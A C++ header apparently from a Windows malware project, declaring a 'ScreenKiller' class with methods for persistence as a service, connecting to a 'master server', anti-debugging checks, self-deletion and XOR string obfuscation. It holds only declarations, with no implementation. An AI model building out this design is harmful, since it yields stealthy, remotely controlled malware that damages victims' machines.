#pragma once

#include <windows.h>
#include <thread>
#include <string>

#define SCREEN_WIDTH	GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_HEIGHT	GetSystemMetrics(SM_CYSCREEN)
#define DIVIDERS		5

#define XOR_KEY 55

#define MAX_COMPUTER_NAME 128
#define SERVICE_NAME L"biss"

class ScreenKiller
{
public:
	ScreenKiller();

	~ScreenKiller();

	void deploy();

	void suicide();

	void exit_if_debugged();

	std::string encrypt_string(std::string input_string);

private:
	bool deploy_inner();

	bool get_persistency();

	bool connect_to_master_server();

	bool is_debugged1();

	bool is_debugged2();

	bool self_debug();

	bool m_alive;
	bool m_persistent;
	bool m_connected;
	std::thread runner_thread;
};

typedef struct ScreenProps
{
	RECT rectScreen;
	HDC hdcScreen;
} ScreenProps, * PScreenProps;
